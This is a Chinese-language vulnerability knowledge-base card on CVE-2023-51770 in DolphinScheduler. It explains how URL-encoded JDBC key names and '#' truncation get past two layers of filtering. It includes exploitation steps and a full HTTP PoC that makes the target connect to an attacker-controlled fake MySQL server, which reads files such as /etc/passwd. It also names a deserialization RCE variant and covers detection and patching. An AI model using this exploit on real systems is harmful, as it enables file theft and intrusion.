---
id: web-java-component-dolphinscheduler-datasource-connect-jdbc-url-filter-bypass-file-read
title: DolphinScheduler 数据源连接 JDBC URL 双层过滤绕过：URL 编码键名绕过 contains 黑名单 +
type: scenario
domain: web
path: web/java/component
technique: dolphinscheduler-datasource-jdbc-url-filter-bypass-local-infile-read
aliases:
- CVE-2023-51770
- DolphinScheduler 任意文件读取
- MySQLDataSourceProcessor getJdbcUrl 绕过
- checkKeyIsLegitimate 绕过
- APPEND_PARAMS 注释截断
- datasources/connect JDBC 注入
- allowLoadLocalInfile 编码键名
tags:
- java
- dolphinscheduler
- jdbc
- mysql
- arbitrary-file-read
- filter-bypass
- url-encoding
- comment-truncation
- malicious-server
cve:
- CVE-2023-51770
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: <3.2.1（原文标记 version<3.2.1，3.2.1 修复）
verification:
  verified_by: verifier-V528
  verified_at: '2026-11-11T15:09:49+08:00'
  notes: 已对照原文与11张截图核对：双层过滤代码（contains黑名单+APPEND_PARAMS）、img09 Evaluate完整拼接URL、img10伪MySQL Read success、img11 Properties修复均一致；affected_versions <3.2.1 与原文version<3.2.1一致，无需调整。未验证点：未搭建环境复现。dedup候选为AJ-Report无校验与通用JDBC绕过卡，过滤层数/产品/PoC不同，非重复。
---

## 一句话结论

Apache DolphinScheduler < 3.2.1 的数据源连接接口把用户提交的 JDBC `other` 参数拼进 MySQL 连接串：键名用 URL 编码即可骗过 `contains` 黑名单，键名中的 `#` 又会在驱动解析时把末尾追加的 `allowLoadLocalInfile=false&autoDeserialize=false...` 变成注释；恢复 `allowLoadLocalInfile=true` 后，连上攻击者伪装的 MySQL 服务端即可用 `LOAD DATA LOCAL INFILE` 读取 DolphinScheduler 服务器任意文件（CVE-2023-51770）。

## 原理

- **入口**：`POST /dolphinscheduler/datasources/connect` 接收数据源 JSON（`type`、`host`、`port`、`database`、`other` 等）。`MySQLDataSourceProcessor#getConnection` 调用 `getJdbcUrl(connectionParam)` 得到连接串后直接 `DriverManager.getConnection`，连接行为完全由该串决定。
- **第一层过滤（黑名单 contains）**：`getJdbcUrl` 发现 `other` 非空时，用 `transformOther` 逐项检查键名；`checkKeyIsLegitimate` 对原始键名做 `contains("allowLoadLocalInfile")`、`contains("autoDeserialize")`、`contains("allowLocalInfile")`、`contains("allowUrlInLocalInfile")`，命中就丢弃该键。
- **第二层过滤（安全参数覆盖）**：`transformOther` 的结果之后还会拼上常量 `APPEND_PARAMS = "allowLoadLocalInfile=false&autoDeserialize=false&allowLocalInfile=false&allowUrlInLocalInfile=false"`，意图用同键的 `false` 覆盖攻击者自设的危险参数。
- **绕过一：键名 URL 编码**。校验函数看到的是尚未解码的键名字符串；把键名写成 `%61%6c%6c%6f%77%4c%6f%61%64%4c%6f%63%61%6c%49%6e%66%69%6c%65`（即 `allowLoadLocalInfile` 的百分号编码），`contains` 不匹配，键被保留。MySQL Connector/J 8.x 在解析 URL 时会对 key 和 value 都做 URL 解码，解码后得到真正的 `allowLoadLocalInfile=true`。
- **绕过二：# 注释截断**。JDBC URL 是类 URL 结构，`#` 之后被视为 fragment。`other` 的键名（JSON 里的 key）本身可以包含 `#`，拼接后成为 `...?%61...%65=%74%72%75%65#=a&allowLoadLocalInfile=false&...`；驱动解析到 `#` 即停止，`APPEND_PARAMS` 整段覆盖参数变成无效注释，第一层保留下来的危险参数生效。
- **最终危害**：`allowLoadLocalInfile=true` 时，驱动接受服务端下发的 `LOAD DATA LOCAL INFILE '<path>'`，按协议读取客户端本地文件并上传给服务端。攻击者控制 MySQL 服务端（伪装握手、下发 LOAD DATA 请求），即可读到目标机器上任意可读文件（如 `/etc/passwd`、应用配置、密钥）。
- **修复方式**：官方补丁（PR #15433）不再把过滤结果拼接成 URL 字符串，而是把校验后的参数放进 `Properties` 对象传给 `DriverManager.getConnection(url, properties)`；`#` 不能再作用于属性集合，且最终以 Properties 中的 `false` 值覆盖，两层过滤才真正生效。

## 触发条件

- Apache DolphinScheduler 版本 < 3.2.1（standalone 或分布式部署均可，接口路径带 `/dolphinscheduler` 前缀）。
- 攻击者具备登录态：请求需要有效 `sessionId`（文中 PoC 携带登录后的 session）。
- 目标可出网/可达攻击者控制的 MySQL 服务端地址（`host`/`port` 由请求指定）。
- 目标 libs 中存在 MySQL Connector/J（原文手动放置 8.0.16 驱动到 api-server/master-server/worker-server/alert-server 的 libs 目录），驱动支持 key/value URL 解码。

## 利用步骤

1. 登录 DolphinScheduler，取得 `sessionId`（Cookie 或同名请求头）。
2. 在 VPS 上启动恶意 MySQL 服务端（如 java-chains 的 `FakeMySqlReadPayload`，指定待读文件路径）。
3. 向 `/dolphinscheduler/datasources/connect` 提交数据源 JSON：`host`/`port` 指向 VPS，`other` 中放入编码后的键 `%61%6c%6c%6f%77%4c%6f%61%64%4c%6f%63%61%6c%49%6e%66%69%6c%65=%74%72%75%65#`（值任意）。
4. 服务端 `transformOther` 保留该键并拼出：`jdbc:mysql://<vps>:<port>/d?%61...%65=%74%72%75%65#=a&allowLoadLocalInfile=false&autoDeserialize=false&...`；驱动解码出 `allowLoadLocalInfile=true`，`#` 后覆盖参数被忽略。
5. 驱动连接伪 MySQL，服务端下发 `LOAD DATA LOCAL INFILE '/etc/passwd'`，DolphinScheduler 进程读取文件并回传，服务端日志出现 `Read success`，文件落入接收目录。
6. 若目标 classpath 有可用 gadget，可把编码键换成 `autoDeserialize` 等参数走反序列化 RCE 路线（同一 `#` 截断同样解除 APPEND_PARAMS 的压制）。

## PoC

```http
POST /dolphinscheduler/datasources/connect HTTP/1.1
Host: <target>:12345
sessionId: <login-session-id>
Content-Type: application/json;charset=UTF-8

{"type":"MYSQL","label":"MYSQL","name":"t2","host":"<vps>","port":3308,"userName":"c","password":"","database":"d","other":{"%61%6c%6c%6f%77%4c%6f%61%64%4c%6f%63%61%6c%49%6e%66%69%6c%65=%74%72%75%65#":"a"}}
```

拼接后实际交给驱动的连接串：

```text
jdbc:mysql://<vps>:3308/d?%61%6c%6c%6f%77%4c%6f%61%64%4c%6f%63%61%6c%49%6e%66%69%6c%65=%74%72%75%65#=a&allowLoadLocalInfile=false&autoDeserialize=false&allowLocalInfile=false&allowUrlInLocalInfile=false
```

恶意 MySQL 服务端日志（原文验证）：`Now try to read file [/tmp/succ]` → `Read success, stored at ./loot/...`，任意文件读取打通。

## 变体与关联

- 变体一：编码键名可换成 `autoDeserialize`（`%61%75%74%6f%44%65%73%65%72%69%61%6c%69%7a%65`），同样的 `#` 截断解除 `autoDeserialize=false` 覆盖，配合伪 MySQL 回吐 gadget 升级为反序列化 RCE；也可试 `allowUrlInLocalInfile`、`allowLocalInfile`、`maxAllowedPacket`。
- 变体二：`#` 也可放在值里或用其变体（`%23` 在部分解析路径上仍会被解码成 `#`），视驱动/框架层解码顺序而定；核心是“应用校验所见”与“驱动解析所用”不一致。
- 关联：[[web-java-deserialization-jdbc-url-waf-parser-bypass]]（同族通用技术：URL 编码键名与 `#` 截断绕过 JDBC 参数过滤，本卡是其产品化、双层过滤形态）；[[web-java-component-aj-report-datasource-testconnection-jdbc-local-infile-read]]（同为数据源测试/连接接口 + 恶意 MySQL 读文件，但 AJ-Report 是 URL 完全无校验，本条是校验被编码/注释绕过）；[[web-java-component-dataease-illegalparameters-client-blacklist-jdbc-autodeserialize]]（黑名单来自请求体被清空，另一类校验失效）；[[web-java-component-dolphinscheduler-switch-scriptengine-eval-rce]]（同产品另一漏洞，可组合利用）。
- 边界：3.2.1 及以上已改用 Properties 传参，本绕过失效；若目标用 5.1 驱动，`allowLoadLocalInfile` 默认即为 true 且无 key 解码差异，行为需实测；需要能连到攻击者服务端的网络条件。

## 检测与防御

- 检测：请求体 `other` 键名出现 `%` 编码、`#`、`&`、`=` 等字符；连接串中出现大量百分号编码的参数名；服务端向非常规 MySQL 地址发起连接并伴随进程读取 `/etc/passwd` 等敏感文件（EDR/auditd）；伪服务端侧可见 `LOAD DATA LOCAL INFILE` 请求。
- 修复：升级到 DolphinScheduler 3.2.1+（PR #15433 改为 Properties 传参）；数据源连接接口限制为管理员可用并做审计。
- 加固：数据源 `host`/`port` 白名单，禁止任意出站；MySQL 驱动侧禁用 `allowLoadLocalInfile`（`allowLoadLocalInfile=false` 且由服务端强制注入，不接受用户参数）；对 `other` 参数做白名单而非黑名单，校验前先做完整 URL 解码与规范化。
